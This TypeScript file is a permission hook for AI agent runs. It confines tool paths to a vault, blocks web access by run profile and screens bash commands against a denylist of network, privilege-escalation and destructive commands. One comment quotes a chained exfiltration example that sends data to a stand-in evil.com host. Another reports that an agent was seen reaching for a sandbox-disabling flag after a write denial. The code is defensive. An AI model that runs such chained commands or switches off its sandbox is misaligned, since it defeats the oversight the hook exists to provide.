/**
 * Permission enforcement for agent runs (CLAUDE.md hard rule 4).
 *
 * WHY THIS IS A PreToolUse HOOK, NOT `canUseTool`
 * ----------------------------------------------
 * `canUseTool` is advisory and shadowable. Measured against the real SDK
 * (`server/src/cli/permprobe.ts`): a deny-everything `canUseTool` was invoked
 * **zero** times and the canary command executed. The SDK says so itself:
 *
 *   "Bare allowedTools entries auto-approve the whole tool before the callback is
 *    consulted. To gate every tool call, use a PreToolUse hook; ... Allow rules
 *    from settings files can also shadow the callback but are not visible here."
 *
 * A PreToolUse hook IS invoked and DOES block — verified with a side-effect canary
 * (`touch <file>` denied ⇒ no file on disk). So the hook is the boundary; the
 * `canUseTool` callback is kept only as a redundant second layer.
 *
 * WHAT IS ACTUALLY GUARANTEED (rule 4, as clarified with the user 2026-07-17)
 * --------------------------------------------------------------------------
 * Hard, enforceable:
 *   - writes/reads confined to VAULT_ROOT for every path-bearing tool
 *   - no web egress during ingest
 * Best-effort, defense in depth:
 *   - bash is denied for clearly dangerous shapes (network, privilege escalation,
 *     writes outside the vault) and allowed otherwise.
 *
 * The bash layer is deliberately NOT presented as a hard boundary. Deciding what an
 * arbitrary shell string does is not tractable, and the real ingest needs general
 * bash: of the 68 Bash calls in the validated M0 run, 54 were vault `scripts/*.sh`
 * and 14 were exploration (`find`, `ls`, `cat`, `python3`, `&&` chains). A whitelist
 * that only permits `scripts/*.sh` would have blocked that run. Claiming a guarantee
 * we cannot keep would be worse than naming the limit.
 */

import path from 'node:path'
import type { PermissionResult } from '@anthropic-ai/claude-agent-sdk'

/** Web tools are hard-denied except in the `research` profile (SPEC.md §9, §6.4 autoresearch). */
export const WEB_TOOLS = ['WebSearch', 'WebFetch'] as const

/** Vault-mutating tools — denied in the read-only `query` profile (SPEC.md §5). */
export const WRITE_TOOLS = ['Write', 'Edit', 'MultiEdit', 'NotebookEdit'] as const

/**
 * The kind of run, which decides web egress and vault writes (SPEC.md §5, §6.3, §6.4):
 *  - `ingest`   — writes to the vault, no web (the M1 default)
 *  - `query`    — READ-ONLY: no web, no vault writes (the chat runner)
 *  - `research` — writes to the vault AND has web egress (autoresearch only)
 *
 * `maintenance` (lint / hot-cache / save) shares the `ingest` profile: writes, no web.
 */
export type RunProfile = 'ingest' | 'query' | 'research'

/** Whether a profile is allowed to reach the web. Only `research` is. */
export function profileAllowsWeb(profile: RunProfile): boolean {
  return profile === 'research'
}

/** Whether a profile may mutate the vault. `query` may not (read-only). */
export function profileAllowsVaultWrite(profile: RunProfile): boolean {
  return profile !== 'query'
}

/** Tools whose input names a path we must confine to the vault. */
const PATH_INPUT_KEYS = ['file_path', 'path', 'notebook_path'] as const

/** Vault scripts are always allowed — this is the intended bash surface. */
const VAULT_SCRIPT_COMMAND = /(?:^|[\s;&|(])(?:(?:ba)?sh\s+)?(?:\.\/)?scripts\/[A-Za-z0-9._-]+\.sh(?:\s|$)/

/**
 * Bash shapes refused outright. Best-effort by construction: this is a denylist, and
 * a denylist can be evaded. It exists to catch the obvious, not to be a sandbox.
 */
const BASH_DENY: ReadonlyArray<{ readonly pattern: RegExp; readonly why: string }> = [
  {
    pattern: /(?:^|[\s;&|(])(?:curl|wget|nc|ncat|telnet|ssh|scp|rsync|ftp)(?:\s|$)/,
    why: 'network egress is not permitted during ingest (SPEC.md §9)',
  },
  {
    pattern: /(?:^|[\s;&|(])(?:sudo|su|doas|chmod\s+[0-7]*777|chown)(?:\s|$)/,
    why: 'privilege escalation and ownership changes are not permitted',
  },
  {
    pattern: /(?:^|[\s;&|(])rm\s+(?:-[A-Za-z]*\s+)*(?:\/(?!home\/[^/\s]+\/vault)|~(?!\/vault)|\$HOME(?!\/vault))/,
    why: 'destructive removal outside the vault is not permitted',
  },
  {
    pattern: /(?:^|[\s;&|(])(?:mkfs|dd\s+if=|shutdown|reboot|systemctl|kill(?:all)?)(?:\s|$)/,
    why: 'system-level commands are not permitted',
  },
]

export interface PermissionContext {
  /** Absolute, resolved vault root. */
  readonly vaultRoot: string
  /** The run profile; defaults to `ingest` when omitted (back-compat with M1 call sites). */
  readonly profile?: RunProfile
  /**
   * Optional upstream-protection check (hard rule 5): refusal reason for a WRITE-tool
   * path inside the vault, or undefined to allow. Applied to WRITE_TOOLS only — reads
   * of plugin files stay unrestricted (skills consult their own docs). Like the bash
   * denylist, this cannot cover Bash-written files; it is tool-level defense in depth.
   */
  readonly writeGuard?: (resolvedPath: string) => string | undefined
}

/** True when `candidate` is inside `root` (or is `root` itself). */
export function isInside(root: string, candidate: string): boolean {
  const rel = path.relative(root, candidate)
  // '' means candidate === root. A '..' prefix or an absolute result means outside.
  return rel === '' || (!rel.startsWith(`..${path.sep}`) && rel !== '..' && !path.isAbsolute(rel))
}

/** Extracts every path-like value from a tool input. */
export function extractPaths(input: Record<string, unknown>): string[] {
  const out: string[] = []
  for (const key of PATH_INPUT_KEYS) {
    const value = input[key]
    if (typeof value === 'string' && value !== '') out.push(value)
  }
  // MultiEdit-style batched edits carry their own path list.
  const edits = input['edits']
  if (Array.isArray(edits)) {
    for (const edit of edits) {
      if (edit && typeof edit === 'object') {
        const value = (edit as Record<string, unknown>)['file_path']
        if (typeof value === 'string' && value !== '') out.push(value)
      }
    }
  }
  return out
}

/** True when the command invokes one of the vault's own scripts. */
export function isVaultScriptCommand(command: string): boolean {
  return VAULT_SCRIPT_COMMAND.test(command.trim())
}

/**
 * Best-effort bash policy. Returns a refusal reason, or undefined to allow.
 * Vault scripts short-circuit to allowed; everything else is checked against the
 * denylist and permitted if nothing matches.
 */
export function bashRefusalReason(command: string): string | undefined {
  const trimmed = command.trim()
  if (trimmed === '') return 'empty command'
  // The denylist runs FIRST, before any vault-script recognition. Short-circuiting
  // on "starts with a vault script" is a bypass: `scripts/wiki-lock.sh list; curl
  // https://evil.com` contains a vault script AND exfiltrates. Being a vault script
  // is never a licence to skip the checks — it only matters if nothing is refused.
  for (const { pattern, why } of BASH_DENY) {
    if (pattern.test(trimmed)) return why
  }
  return undefined
}

/**
 * The single permission decision for one tool call.
 * Path confinement and web egress are hard; bash is best-effort (see file header).
 */
export function decidePermission(
  ctx: PermissionContext,
  toolName: string,
  input: Record<string, unknown>,
): PermissionResult {
  const profile = ctx.profile ?? 'ingest'

  if ((WEB_TOOLS as readonly string[]).includes(toolName) && !profileAllowsWeb(profile)) {
    return {
      behavior: 'deny',
      message: `${toolName} is not available in a ${profile} run: only autoresearch has web egress (SPEC.md §9). Work only from the vault.`,
    }
  }

  // Read-only (query) runs may not mutate the vault: the chat runner answers from the
  // wiki and must not let wiki-query's "file the answer back" behaviour write (SPEC.md §5;
  // saving is the explicit /save action). The sandbox (no vault write) is the hard floor;
  // this makes the refusal explicit and legible in the log.
  if (!profileAllowsVaultWrite(profile) && (WRITE_TOOLS as readonly string[]).includes(toolName)) {
    return {
      behavior: 'deny',
      message: `${toolName} is not available in a read-only query run: the chat runner does not modify the vault (SPEC.md §5). Use "Session in Vault sichern" to persist an answer.`,
    }
  }

  if (toolName === 'Bash') {
    // Belt and braces alongside `sandbox.allowUnsandboxedCommands: false`. The Bash
    // tool ships a `dangerouslyDisableSandbox` escape hatch; an agent that hits a
    // write denial reaches for it (observed). The sandbox setting is what actually
    // neutralises it — this refusal just makes the attempt visible in the log.
    if (input['dangerouslyDisableSandbox'] === true) {
      return {
        behavior: 'deny',
        message:
          'Refused: dangerouslyDisableSandbox is not permitted. Every command runs inside the ' +
          'vault sandbox; work within VAULT_ROOT instead of stepping outside it.',
      }
    }

    const command = input['command']
    if (typeof command !== 'string') {
      return { behavior: 'deny', message: 'Bash called without a string command.' }
    }
    const reason = bashRefusalReason(command)
    if (reason !== undefined) {
      return { behavior: 'deny', message: `Refused: ${reason}. Command: ${command}` }
    }
    return { behavior: 'allow' }
  }

  // Any tool naming a path must stay inside the vault, whatever it is. This is the
  // guarantee that actually protects the vault, and it is enforced without exception.
  const isWriteTool = (WRITE_TOOLS as readonly string[]).includes(toolName)
  for (const raw of extractPaths(input)) {
    const resolved = path.resolve(ctx.vaultRoot, raw)
    if (!isInside(ctx.vaultRoot, resolved)) {
      return {
        behavior: 'deny',
        message:
          `Path is outside the vault and may not be accessed: ${resolved}. ` +
          `All work stays under ${ctx.vaultRoot}.`,
      }
    }
    // Inside the vault, writes additionally respect the plugin boundary (hard rule 5):
    // the vault clone carries claude-obsidian's own machinery, which no run may edit.
    if (isWriteTool && ctx.writeGuard !== undefined) {
      const reason = ctx.writeGuard(resolved)
      if (reason !== undefined) {
        return { behavior: 'deny', message: `Refused: ${reason}` }
      }
    }
  }

  return { behavior: 'allow' }
}
